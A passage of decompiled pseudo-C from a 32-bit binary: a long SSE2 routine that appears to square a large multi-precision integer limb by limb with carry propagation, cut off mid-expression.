  __m128i v571; // xmm3
  __m128i v572; // xmm2
  __m128i v573; // xmm6
  __m128i v574; // xmm7
  __m128i v575; // xmm6
  __m128i v576; // xmm7
  __m128i v577; // xmm5
  __m128i v578; // xmm0
  __m128i v579; // xmm1
  __m128 v580; // xmm6
  __m128 v581; // xmm4
  __m128i v582; // xmm6
  int v583; // ecx
  __m128 v584; // xmm5
  __m128i v585; // xmm4
  __m128i v586; // xmm7
  __m128i v587; // xmm5
  __m128i v588; // xmm6
  __m128i v589; // xmm4
  __m128i v590; // xmm5
  __m128i *v591; // edx
  __m128i v592; // xmm7
  __m128i v593; // xmm6
  __m128i v594; // xmm7
  int result; // eax
  __m128i v596; // xmm6
  __m128i v597; // xmm7
  __m128i v598; // xmm5
  __m128i v599; // xmm0
  __m128i v600; // xmm1
  __m128 v601; // xmm6
  __m128 v602; // xmm4
  __m128i v603; // xmm6
  int v604; // ecx
  __m128 v605; // xmm5
  __m128i v606; // xmm4
  __m128i v607; // xmm7
  __m128i v608; // xmm5
  __m128i v609; // xmm6
  __m128i v610; // xmm4
  __m128i v611; // xmm5
  __m128i *v612; // edx
  __m128i v613; // xmm7
  __m128i v614; // xmm3
  __m128i v615; // xmm1
  __m128i v616; // xmm3
  __m128i v617; // xmm2
  __m128i v618; // xmm6
  __m128i v619; // xmm7
  __m128i v620; // xmm6
  __m128i v621; // xmm7
  __m128i v622; // xmm5
  __m128i v623; // xmm0
  __m128i v624; // xmm1
  __m128 v625; // xmm6
  __m128 v626; // xmm4
  __m128i v627; // xmm6
  __m128 v628; // xmm5
  __m128i v629; // xmm4
  __m128i v630; // xmm7
  __m128i v631; // xmm5
  __m128i v632; // xmm6
  __m128i v633; // xmm4
  __m128i v634; // xmm5
  __m128i v635; // xmm7
  __m128i v636; // xmm6
  __m128i v637; // xmm7
  __m128i v638; // xmm6
  __m128i v639; // xmm7
  __m128i v640; // xmm0
  __m128i v641; // xmm1
  __m128i v642; // xmm4
  __m128i v643; // xmm5
  __m128i v644; // xmm6
  __m128i v645; // xmm5
  __m128i v646; // xmm4
  __m128i v647; // xmm7
  __m128i v648; // xmm0
  __m128i v649; // xmm7
  __m128i v650; // xmm6
  __m128i v651; // xmm2
  __m128i v652; // xmm5
  __m128i v653; // xmm6
  __m128i v654; // xmm7
  __m128i v655; // xmm0
  __m128i v656; // xmm1
  __m128i v657; // xmm4
  __m128i v658; // xmm5
  __m128i v659; // xmm6
  __m128i v660; // [esp+0h] [ebp-21Ch] BYREF
  __m128i v661; // [esp+10h] [ebp-20Ch] BYREF
  __m128i v662; // [esp+20h] [ebp-1FCh] BYREF
  __m128i v663; // [esp+30h] [ebp-1ECh] BYREF
  __m128i v664; // [esp+40h] [ebp-1DCh] BYREF
  __m128i v665; // [esp+50h] [ebp-1CCh] BYREF
  __m128i v666; // [esp+60h] [ebp-1BCh] BYREF
  __m128i v667; // [esp+70h] [ebp-1ACh] BYREF
  __m128i v668; // [esp+80h] [ebp-19Ch] BYREF
  __m128i v669; // [esp+90h] [ebp-18Ch] BYREF
  __m128i v670; // [esp+A0h] [ebp-17Ch] BYREF
  __m128i v671; // [esp+B0h] [ebp-16Ch] BYREF
  __m128i v672; // [esp+C0h] [ebp-15Ch] BYREF
  __m128i v673; // [esp+D0h] [ebp-14Ch] BYREF
  __m128i v674; // [esp+E0h] [ebp-13Ch] BYREF
  __m128i v675; // [esp+F0h] [ebp-12Ch] BYREF
  __m128i v676; // [esp+100h] [ebp-11Ch] BYREF
  __m128i v677; // [esp+110h] [ebp-10Ch]
  __m128i v678[15]; // [esp+120h] [ebp-FCh]

  for ( i = 0; i != 128; i += 16 )
  {
    v3 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    *(__m128i *)((char *)&v661 + 2 * i) = v3;
    *(__m128i *)((char *)&v661 + 2 * i + 16) = _mm_srli_epi64(v3, 0x20u);
    *(__m128i *)((char *)&v677 + 2 * i) = v4;
    v678[i / 8] = _mm_srli_epi64(v4, 0x20u);
  }
  v5 = _mm_load_si128(&v661);
  v6 = _mm_mul_epu32(v5, v5);
  si128 = _mm_load_si128(&stru_46C990);
  v8 = _mm_and_si128(si128, v6);
  v9 = _mm_mul_epu32(v5, v677);
  v10 = _mm_and_si128(si128, v9);
  v11 = _mm_srli_epi32(v9, 0x10u);
  v12 = _mm_move_epi64(v10);
  v13 = _mm_move_epi64(v11);
  v14 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v10, v12), v12), 4);
  v15 = (__m128)_mm_add_epi32(v8, (__m128i)v14);
  v16 = (__m128i)_mm_movehl_ps(v14, v15);
  *(_DWORD *)a1 = _mm_cvtsi128_si32((__m128i)v15);
  v17 = (__m128)_mm_add_epi32(
                  _mm_srli_epi32(v6, 0x10u),
                  _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v11, v13), v13), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v17);
  v18 = _mm_add_epi64(_mm_srli_epi64((__m128i)v15, 0x10u), (__m128i)v17);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v18, 0x30u), v16).m128i_u64[0];
  v19 = _mm_load_si128(&v662);
  v20 = _mm_mul_epu32(_mm_load_si128(&v661), v19);
  v21 = _mm_load_si128(&stru_46C990);
  v22 = _mm_and_si128(v21, v20);
  v23 = _mm_srli_epi32(v20, 0x10u);
  v24 = _mm_mul_epu32(v19, v677);
  v25 = _mm_and_si128(v21, v24);
  v26 = _mm_srli_epi32(v24, 0x10u);
  v27 = _mm_add_epi32(v25, v25);
  v28 = _mm_add_epi32(v26, v26);
  v29 = _mm_add_epi32(_mm_add_epi32(v23, v23), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v30 = _mm_move_epi64(v27);
  v31 = _mm_move_epi64(v28);
  v32 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v30), v30), 4);
  v33 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v22, v22), _mm_loadl_epi64(&v660)), (__m128i)v32);
  v34 = (__m128i)_mm_movehl_ps(v32, v33);
  *(_DWORD *)(a1 + 8) = _mm_cvtsi128_si32((__m128i)v33);
  v35 = (__m128)_mm_add_epi32(v29, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v31), v31), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v35);
  v36 = _mm_add_epi64(_mm_srli_epi64((__m128i)v33, 0x10u), (__m128i)v35);
  *(_QWORD *)(a1 + 10) = v36.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v36, 0x30u), v34).m128i_u64[0];
  v37 = _mm_load_si128(&v663);
  v38 = _mm_mul_epu32(_mm_load_si128(&v661), v37);
  v39 = _mm_load_si128(&stru_46C990);
  v40 = _mm_and_si128(v39, v38);
  v41 = _mm_srli_epi32(v38, 0x10u);
  v42 = _mm_mul_epu32(v37, v677);
  v43 = _mm_load_si128(&v662);
  v44 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v662.m128i_i8[8]), v43);
  v45 = _mm_mul_epu32(v43, v43);
  v46 = v39;
  v47 = _mm_add_epi32(_mm_and_si128(v39, v42), _mm_and_si128(v39, v44));
  v48 = _mm_add_epi32(_mm_srli_epi32(v42, 0x10u), _mm_srli_epi32(v44, 0x10u));
  v49 = _mm_add_epi32(v47, v47);
  v50 = _mm_add_epi32(v48, v48);
  v51 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v41, v41), _mm_srli_epi32(v45, 0x10u)),
          _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v52 = _mm_move_epi64(v49);
  v53 = _mm_move_epi64(v50);
  v54 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v49, v52), v52), 4);
  v55 = (__m128)_mm_add_epi32(
                  _mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v40, v40), _mm_and_si128(v46, v45)), _mm_loadl_epi64(&v660)),
                  (__m128i)v54);
  v56 = (__m128i)_mm_movehl_ps(v54, v55);
  *(_DWORD *)(a1 + 16) = _mm_cvtsi128_si32((__m128i)v55);
  v57 = (__m128)_mm_add_epi32(v51, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v50, v53), v53), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v57);
  v58 = _mm_add_epi64(_mm_srli_epi64((__m128i)v55, 0x10u), (__m128i)v57);
  *(_QWORD *)(a1 + 18) = v58.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v58, 0x30u), v56).m128i_u64[0];
  v59 = _mm_load_si128(&v663);
  v60 = _mm_mul_epu32(_mm_load_si128(&v662), v59);
  v61 = _mm_load_si128(&stru_46C990);
  v62 = _mm_and_si128(v61, v60);
  v63 = _mm_srli_epi32(v60, 0x10u);
  v64 = _mm_mul_epu32(v59, v678[0]);
  v65 = _mm_and_si128(v61, v64);
  v66 = _mm_srli_epi32(v64, 0x10u);
  sub_419ECB((int)&v663, &v662);
  v67 = _mm_add_epi32(v65, v65);
  v68 = _mm_add_epi32(v66, v66);
  v69 = _mm_add_epi32(_mm_add_epi32(v63, v63), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v70 = _mm_move_epi64(v67);
  v71 = _mm_move_epi64(v68);
  v72 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v67, v70), v70), 4);
  v73 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v62, v62), _mm_loadl_epi64(&v660)), (__m128i)v72);
  v74 = (__m128i)_mm_movehl_ps(v72, v73);
  *(_DWORD *)(v75 + 24) = _mm_cvtsi128_si32((__m128i)v73);
  v76 = (__m128)_mm_add_epi32(v69, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v68, v71), v71), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v76);
  v77 = _mm_add_epi64(_mm_srli_epi64((__m128i)v73, 0x10u), (__m128i)v76);
  *(_QWORD *)(v75 + 26) = v77.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v77, 0x30u), v74).m128i_u64[0];
  v78 = _mm_load_si128(&v664);
  v79 = _mm_mul_epu32(_mm_load_si128(&v662), v78);
  v80 = _mm_load_si128(&stru_46C990);
  v81 = _mm_and_si128(v80, v79);
  v82 = _mm_srli_epi32(v79, 0x10u);
  v84 = _mm_mul_epu32(v78, *(__m128i *)(v83 - 16));
  sub_419ECB((int)&v663, &v663);
  v85 = _mm_load_si128(&v663);
  v86 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v663.m128i_i8[8]), v85);
  v87 = _mm_mul_epu32(v85, v85);
  v88 = _mm_load_si128(&stru_46C990);
  v89 = _mm_add_epi32(_mm_and_si128(v80, v84), _mm_and_si128(v88, v86));
  v90 = _mm_add_epi32(_mm_srli_epi32(v84, 0x10u), _mm_srli_epi32(v86, 0x10u));
  v91 = _mm_add_epi32(v89, v89);
  v92 = _mm_add_epi32(v90, v90);
  v93 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v82, v82), _mm_srli_epi32(v87, 0x10u)),
          _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v94 = _mm_move_epi64(v91);
  v95 = _mm_move_epi64(v92);
  v96 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v91, v94), v94), 4);
  v97 = (__m128)_mm_add_epi32(
                  _mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v81, v81), _mm_and_si128(v88, v87)), _mm_loadl_epi64(&v660)),
                  (__m128i)v96);
  v98 = (__m128i)_mm_movehl_ps(v96, v97);
  *(_DWORD *)(v99 + 32) = _mm_cvtsi128_si32((__m128i)v97);
  v100 = (__m128)_mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v92, v95), v95), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v100);
  v101 = _mm_add_epi64(_mm_srli_epi64((__m128i)v97, 0x10u), (__m128i)v100);
  *(_QWORD *)(v99 + 34) = v101.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v101, 0x30u), v98).m128i_u64[0];
  v102 = _mm_load_si128(&v664);
  v103 = _mm_mul_epu32(_mm_load_si128(&v663), v102);
  v104 = _mm_load_si128(&stru_46C990);
  v105 = _mm_and_si128(v104, v103);
  v106 = _mm_srli_epi32(v103, 0x10u);
  v108 = _mm_mul_epu32(v102, *v107);
  v109 = _mm_and_si128(v104, v108);
  v110 = _mm_srli_epi32(v108, 0x10u);
  sub_419E8E();
  v111 = _mm_add_epi32(v109, v109);
  v112 = _mm_add_epi32(v110, v110);
  v113 = _mm_add_epi32(_mm_add_epi32(v106, v106), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v114 = _mm_move_epi64(v111);
  v115 = _mm_move_epi64(v112);
  v116 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v111, v114), v114), 4);
  v117 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v105, v105), _mm_loadl_epi64(&v660)), (__m128i)v116);
  v118 = (__m128i)_mm_movehl_ps(v116, v117);
  *(_DWORD *)(v119 + 40) = _mm_cvtsi128_si32((__m128i)v117);
  v120 = (__m128)_mm_add_epi32(v113, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v115), v115), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v120);
  v121 = _mm_add_epi64(_mm_srli_epi64((__m128i)v117, 0x10u), (__m128i)v120);
  *(_QWORD *)(v119 + 42) = v121.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v121, 0x30u), v118).m128i_u64[0];
  v122 = _mm_load_si128(&v665);
  v123 = _mm_mul_epu32(_mm_load_si128(&v663), v122);
  v124 = _mm_load_si128(&stru_46C990);
  v125 = _mm_and_si128(v124, v123);
  v126 = _mm_srli_epi32(v123, 0x10u);
  v128 = _mm_mul_epu32(v122, *(__m128i *)(v127 - 16));
  sub_419E8E();
  v129 = _mm_load_si128(&v664);
  v130 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v664.m128i_i8[8]), v129);
  v131 = _mm_mul_epu32(v129, v129);
  v132 = _mm_load_si128(&stru_46C990);
  v133 = _mm_add_epi32(_mm_and_si128(v124, v128), _mm_and_si128(v132, v130));
  v134 = _mm_add_epi32(_mm_srli_epi32(v128, 0x10u), _mm_srli_epi32(v130, 0x10u));
  v135 = _mm_add_epi32(v133, v133);
  v136 = _mm_add_epi32(v134, v134);
  v137 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v126, v126), _mm_srli_epi32(v131, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v138 = _mm_move_epi64(v135);
  v139 = _mm_move_epi64(v136);
  v140 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v135, v138), v138), 4);
  v141 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v125, v125), _mm_and_si128(v132, v131)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v140);
  v142 = (__m128i)_mm_movehl_ps(v140, v141);
  *(_DWORD *)(v143 + 48) = _mm_cvtsi128_si32((__m128i)v141);
  v144 = (__m128)_mm_add_epi32(v137, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v136, v139), v139), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v144);
  v145 = _mm_add_epi64(_mm_srli_epi64((__m128i)v141, 0x10u), (__m128i)v144);
  *(_QWORD *)(v143 + 50) = v145.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v145, 0x30u), v142).m128i_u64[0];
  v146 = _mm_load_si128(&v665);
  v147 = _mm_mul_epu32(_mm_load_si128(&v664), v146);
  v148 = _mm_load_si128(&stru_46C990);
  v149 = _mm_and_si128(v148, v147);
  v150 = _mm_srli_epi32(v147, 0x10u);
  v152 = _mm_mul_epu32(v146, *v151);
  v153 = _mm_and_si128(v148, v152);
  v154 = _mm_srli_epi32(v152, 0x10u);
  sub_419E51();
  v155 = _mm_add_epi32(v153, v153);
  v156 = _mm_add_epi32(v154, v154);
  v157 = _mm_add_epi32(_mm_add_epi32(v150, v150), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v158 = _mm_move_epi64(v155);
  v159 = _mm_move_epi64(v156);
  v160 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v155, v158), v158), 4);
  v161 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v149, v149), _mm_loadl_epi64(&v660)), (__m128i)v160);
  v162 = (__m128i)_mm_movehl_ps(v160, v161);
  *(_DWORD *)(v163 + 56) = _mm_cvtsi128_si32((__m128i)v161);
  v164 = (__m128)_mm_add_epi32(v157, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v156, v159), v159), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v164);
  v165 = _mm_add_epi64(_mm_srli_epi64((__m128i)v161, 0x10u), (__m128i)v164);
  *(_QWORD *)(v163 + 58) = v165.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v165, 0x30u), v162).m128i_u64[0];
  v166 = _mm_load_si128(&v666);
  v167 = _mm_mul_epu32(_mm_load_si128(&v664), v166);
  v168 = _mm_load_si128(&stru_46C990);
  v169 = _mm_and_si128(v168, v167);
  v170 = _mm_srli_epi32(v167, 0x10u);
  v172 = _mm_mul_epu32(v166, *(__m128i *)(v171 - 16));
  sub_419E51();
  v173 = _mm_load_si128(&v665);
  v174 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v665.m128i_i8[8]), v173);
  v175 = _mm_mul_epu32(v173, v173);
  v176 = _mm_load_si128(&stru_46C990);
  v177 = _mm_add_epi32(_mm_and_si128(v168, v172), _mm_and_si128(v176, v174));
  v178 = _mm_add_epi32(_mm_srli_epi32(v172, 0x10u), _mm_srli_epi32(v174, 0x10u));
  v179 = _mm_add_epi32(v177, v177);
  v180 = _mm_add_epi32(v178, v178);
  v181 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v170, v170), _mm_srli_epi32(v175, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v182 = _mm_move_epi64(v179);
  v183 = _mm_move_epi64(v180);
  v184 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v179, v182), v182), 4);
  v185 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v169, v169), _mm_and_si128(v176, v175)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v184);
  v186 = (__m128i)_mm_movehl_ps(v184, v185);
  *(_DWORD *)(v187 + 64) = _mm_cvtsi128_si32((__m128i)v185);
  v188 = (__m128)_mm_add_epi32(v181, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v180, v183), v183), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v188);
  v189 = _mm_add_epi64(_mm_srli_epi64((__m128i)v185, 0x10u), (__m128i)v188);
  *(_QWORD *)(v187 + 66) = v189.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v189, 0x30u), v186).m128i_u64[0];
  v190 = _mm_load_si128(&v666);
  v191 = _mm_mul_epu32(_mm_load_si128(&v665), v190);
  v192 = _mm_load_si128(&stru_46C990);
  v193 = _mm_and_si128(v192, v191);
  v194 = _mm_srli_epi32(v191, 0x10u);
  v196 = _mm_mul_epu32(v190, *v195);
  v197 = _mm_and_si128(v192, v196);
  v198 = _mm_srli_epi32(v196, 0x10u);
  sub_419E14();
  v199 = _mm_add_epi32(v197, v197);
  v200 = _mm_add_epi32(v198, v198);
  v201 = _mm_add_epi32(_mm_add_epi32(v194, v194), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v202 = _mm_move_epi64(v199);
  v203 = _mm_move_epi64(v200);
  v204 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v199, v202), v202), 4);
  v205 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v193, v193), _mm_loadl_epi64(&v660)), (__m128i)v204);
  v206 = (__m128i)_mm_movehl_ps(v204, v205);
  *(_DWORD *)(v207 + 72) = _mm_cvtsi128_si32((__m128i)v205);
  v208 = (__m128)_mm_add_epi32(v201, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v200, v203), v203), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v208);
  v209 = _mm_add_epi64(_mm_srli_epi64((__m128i)v205, 0x10u), (__m128i)v208);
  *(_QWORD *)(v207 + 74) = v209.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v209, 0x30u), v206).m128i_u64[0];
  v210 = _mm_load_si128(&v667);
  v211 = _mm_mul_epu32(_mm_load_si128(&v665), v210);
  v212 = _mm_load_si128(&stru_46C990);
  v213 = _mm_and_si128(v212, v211);
  v214 = _mm_srli_epi32(v211, 0x10u);
  v216 = _mm_mul_epu32(v210, *(__m128i *)(v215 - 16));
  sub_419E14();
  v217 = _mm_load_si128(&v666);
  v218 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v666.m128i_i8[8]), v217);
  v219 = _mm_mul_epu32(v217, v217);
  v220 = _mm_load_si128(&stru_46C990);
  v221 = _mm_add_epi32(_mm_and_si128(v212, v216), _mm_and_si128(v220, v218));
  v222 = _mm_add_epi32(_mm_srli_epi32(v216, 0x10u), _mm_srli_epi32(v218, 0x10u));
  v223 = _mm_add_epi32(v221, v221);
  v224 = _mm_add_epi32(v222, v222);
  v225 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v214, v214), _mm_srli_epi32(v219, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v226 = _mm_move_epi64(v223);
  v227 = _mm_move_epi64(v224);
  v228 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v223, v226), v226), 4);
  v229 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v213, v213), _mm_and_si128(v220, v219)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v228);
  v230 = (__m128i)_mm_movehl_ps(v228, v229);
  *(_DWORD *)(v231 + 80) = _mm_cvtsi128_si32((__m128i)v229);
  v232 = (__m128)_mm_add_epi32(v225, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v224, v227), v227), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v232);
  v233 = _mm_add_epi64(_mm_srli_epi64((__m128i)v229, 0x10u), (__m128i)v232);
  *(_QWORD *)(v231 + 82) = v233.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v233, 0x30u), v230).m128i_u64[0];
  v234 = _mm_load_si128(&v667);
  v235 = _mm_mul_epu32(_mm_load_si128(&v666), v234);
  v236 = _mm_load_si128(&stru_46C990);
  v237 = _mm_and_si128(v236, v235);
  v238 = _mm_srli_epi32(v235, 0x10u);
  v240 = _mm_mul_epu32(v234, *v239);
  v241 = _mm_and_si128(v236, v240);
  v242 = _mm_srli_epi32(v240, 0x10u);
  sub_419DD7();
  v243 = _mm_add_epi32(v241, v241);
  v244 = _mm_add_epi32(v242, v242);
  v245 = _mm_add_epi32(_mm_add_epi32(v238, v238), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v246 = _mm_move_epi64(v243);
  v247 = _mm_move_epi64(v244);
  v248 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v243, v246), v246), 4);
  v249 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v237, v237), _mm_loadl_epi64(&v660)), (__m128i)v248);
  v250 = (__m128i)_mm_movehl_ps(v248, v249);
  *(_DWORD *)(v251 + 88) = _mm_cvtsi128_si32((__m128i)v249);
  v252 = (__m128)_mm_add_epi32(v245, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v244, v247), v247), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v252);
  v253 = _mm_add_epi64(_mm_srli_epi64((__m128i)v249, 0x10u), (__m128i)v252);
  *(_QWORD *)(v251 + 90) = v253.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v253, 0x30u), v250).m128i_u64[0];
  v254 = _mm_load_si128(&v668);
  v255 = _mm_mul_epu32(_mm_load_si128(&v666), v254);
  v256 = _mm_load_si128(&stru_46C990);
  v257 = _mm_and_si128(v256, v255);
  v258 = _mm_srli_epi32(v255, 0x10u);
  v260 = _mm_mul_epu32(v254, *(__m128i *)(v259 - 16));
  sub_419DD7();
  v261 = _mm_load_si128(&v667);
  v262 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v667.m128i_i8[8]), v261);
  v263 = _mm_mul_epu32(v261, v261);
  v264 = _mm_load_si128(&stru_46C990);
  v265 = _mm_add_epi32(_mm_and_si128(v256, v260), _mm_and_si128(v264, v262));
  v266 = _mm_add_epi32(_mm_srli_epi32(v260, 0x10u), _mm_srli_epi32(v262, 0x10u));
  v267 = _mm_add_epi32(v265, v265);
  v268 = _mm_add_epi32(v266, v266);
  v269 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v258, v258), _mm_srli_epi32(v263, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v270 = _mm_move_epi64(v267);
  v271 = _mm_move_epi64(v268);
  v272 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v267, v270), v270), 4);
  v273 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v257, v257), _mm_and_si128(v264, v263)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v272);
  v274 = (__m128i)_mm_movehl_ps(v272, v273);
  *(_DWORD *)(v275 + 96) = _mm_cvtsi128_si32((__m128i)v273);
  v276 = (__m128)_mm_add_epi32(v269, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v268, v271), v271), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v276);
  v277 = _mm_add_epi64(_mm_srli_epi64((__m128i)v273, 0x10u), (__m128i)v276);
  *(_QWORD *)(v275 + 98) = v277.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v277, 0x30u), v274).m128i_u64[0];
  v278 = _mm_load_si128(&v668);
  v279 = _mm_mul_epu32(_mm_load_si128(&v667), v278);
  v280 = _mm_load_si128(&stru_46C990);
  v281 = _mm_and_si128(v280, v279);
  v282 = _mm_srli_epi32(v279, 0x10u);
  v284 = _mm_mul_epu32(v278, *v283);
  v285 = _mm_and_si128(v280, v284);
  v286 = _mm_srli_epi32(v284, 0x10u);
  sub_419D9A();
  v287 = _mm_add_epi32(v285, v285);
  v288 = _mm_add_epi32(v286, v286);
  v289 = _mm_add_epi32(_mm_add_epi32(v282, v282), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v290 = _mm_move_epi64(v287);
  v291 = _mm_move_epi64(v288);
  v292 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v287, v290), v290), 4);
  v293 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v281, v281), _mm_loadl_epi64(&v660)), (__m128i)v292);
  v294 = (__m128i)_mm_movehl_ps(v292, v293);
  *(_DWORD *)(v295 + 104) = _mm_cvtsi128_si32((__m128i)v293);
  v296 = (__m128)_mm_add_epi32(v289, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v288, v291), v291), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v296);
  v297 = _mm_add_epi64(_mm_srli_epi64((__m128i)v293, 0x10u), (__m128i)v296);
  *(_QWORD *)(v295 + 106) = v297.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v297, 0x30u), v294).m128i_u64[0];
  v298 = _mm_load_si128(&v669);
  v299 = _mm_mul_epu32(_mm_load_si128(&v667), v298);
  v300 = _mm_load_si128(&stru_46C990);
  v301 = _mm_and_si128(v300, v299);
  v302 = _mm_srli_epi32(v299, 0x10u);
  v304 = _mm_mul_epu32(v298, *(__m128i *)(v303 - 16));
  sub_419D9A();
  v305 = _mm_load_si128(&v668);
  v306 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v668.m128i_i8[8]), v305);
  v307 = _mm_mul_epu32(v305, v305);
  v308 = _mm_load_si128(&stru_46C990);
  v309 = _mm_add_epi32(_mm_and_si128(v300, v304), _mm_and_si128(v308, v306));
  v310 = _mm_add_epi32(_mm_srli_epi32(v304, 0x10u), _mm_srli_epi32(v306, 0x10u));
  v311 = _mm_add_epi32(v309, v309);
  v312 = _mm_add_epi32(v310, v310);
  v313 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v302, v302), _mm_srli_epi32(v307, 0x10u)),
